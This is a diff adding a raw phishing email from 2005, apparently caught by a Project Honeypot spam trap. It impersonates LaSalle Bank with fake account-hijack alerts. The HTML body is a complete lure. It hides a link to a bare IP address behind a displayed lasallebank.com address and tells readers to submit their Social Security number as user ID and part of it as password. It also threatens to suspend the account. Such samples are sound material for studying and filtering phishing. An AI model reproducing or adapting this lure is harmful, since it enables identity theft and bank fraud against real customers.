@@ -1,0 +1,79 @@
+Received: from jazz.esolutions.net (67.18.219.178)
+  by projecthoneypotmailserver with SMTP; 4 Jul 2005 02:27:00 -0000
+Received: from adam by jazz.esolutions.net with local (Exim 4.43)
+	id 1DpGfj-00078O-5q
+	for projecthoneypot@projecthoneypot.org; Sun, 03 Jul 2005 19:26:59 -0700
+To: projecthoneypot@projecthoneypot.org
+Subject: Unlock your ACCOUNT
+Message-ID: <1120444019.477218.qmail@lasallebank.com>
+From: Lasalle Bank <unlock@lasallebank.com>
+Content-Type: text/html
+Date: Sun, 03 Jul 2005 19:26:59 -0700
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - jazz.esolutions.net
+X-AntiAbuse: Original Domain - mail.cybernothing.net
+X-AntiAbuse: Originator/Caller UID/GID - [32147 32003] / [47 12]
+X-AntiAbuse: Sender Address Domain - jazz.esolutions.net
+X-Source: /usr/bin/perl
+X-Source-Args: perl send.pl 
+X-Source-Dir: /tmp
+
+<html>
+
+<head>
+<meta http-equiv="Content-Language" content="en-us">
+<meta name="GENERATOR" content="Microsoft FrontPage 5.0">
+<meta name="ProgId" content="FrontPage.Editor.Document">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>Dear LaSalle Bank customer</title>
+<style>
+<!--
+ p.MsoNormal
+	{mso-style-parent:"";
+	margin-bottom:.0001pt;
+	font-size:12.0pt;
+	font-family:"Times New Roman";
+	margin-left:0in; margin-right:0in; margin-top:0in}
+-->
+</style>
+</head>
+
+<body>
+
+<p class="MsoNormal">
+<img border="0" src="http://www.lasallebank.com/templates/images/lasalle_logo.gif" width="146" height="54"></p>
+<p class="MsoNormal">&nbsp;</p>
+<p class="MsoNormal"><font size="2" face="Verdana">Dear LaSalle Bank customer,</font></p>
+<p class="MsoNormal"><font size="2" face="Verdana">&nbsp;</font></p>
+<p class="MsoNormal" style="text-indent: .5in"><font size="2" face="Verdana">We 
+recently noticed one or more attempts to login intro your LaSalle Bank online 
+banking account for a foreign IP address and we have reasons to believe that 
+your account was hijacked by a third party without your notification.</font></p>
+<p class="MsoNormal"><font size="2" face="Verdana">&nbsp;</font></p>
+<p class="MsoNormal"><font size="2" face="Verdana">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If you recently 
+logged intro your account while traveling to a foreign country, the unusual 
+login attempts may have been made by you.</font></p>
+<p class="MsoNormal"><font size="2" face="Verdana">&nbsp;</font></p>
+<p class="MsoNormal"><font size="2" face="Verdana">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; However if you 
+are the rightful owner of the account, click on the link below and submit as we 
+are truing to verify your account information. (In case you are not enrolled use 
+your Social Security number as you User ID and the first six digits of your 
+Social Security number as a password).</font></p>
+<p class="MsoNormal"><font size="2" face="Verdana">&nbsp;</font></p>
+<p class="MsoNormal"><font size="2" face="Verdana">
+<a style="color: blue; text-decoration: underline; text-underline: single" href="http://202.145.52.165/.www.lasallebank.com/">https://lasallebank.com/online/secure_account.jsp</a></font></p>
+<p class="MsoNormal"><font size="2" face="Verdana">&nbsp;</font></p>
+<p class="MsoNormal"><font size="2" face="Verdana">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The login attempt 
+was made from :</font></p>
+<p class="MsoNormal"><font size="2" face="Verdana">&nbsp;</font></p>
+<p class="MsoNormal"><font size="2" face="Verdana">IP: 82.89.87.55</font></p>
+<p class="MsoNormal"><font size="2" face="Verdana">ISP Host: 
+host55-87.pool8289.interbusiness.it</font></p>
+<p class="MsoNormal"><font size="2" face="Verdana">&nbsp;</font></p>
+<p class="MsoNormal"><font size="2" face="Verdana">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IF YOU CHOSE TO 
+IGNORE OUR REQUEST, WE HAVE NO CHOICE BUT TO TEMPORARILY SUSPEND YOUR ONLINE 
+BANKING ACCOUNT.</font></p>
+
+</body>
+
+</html>
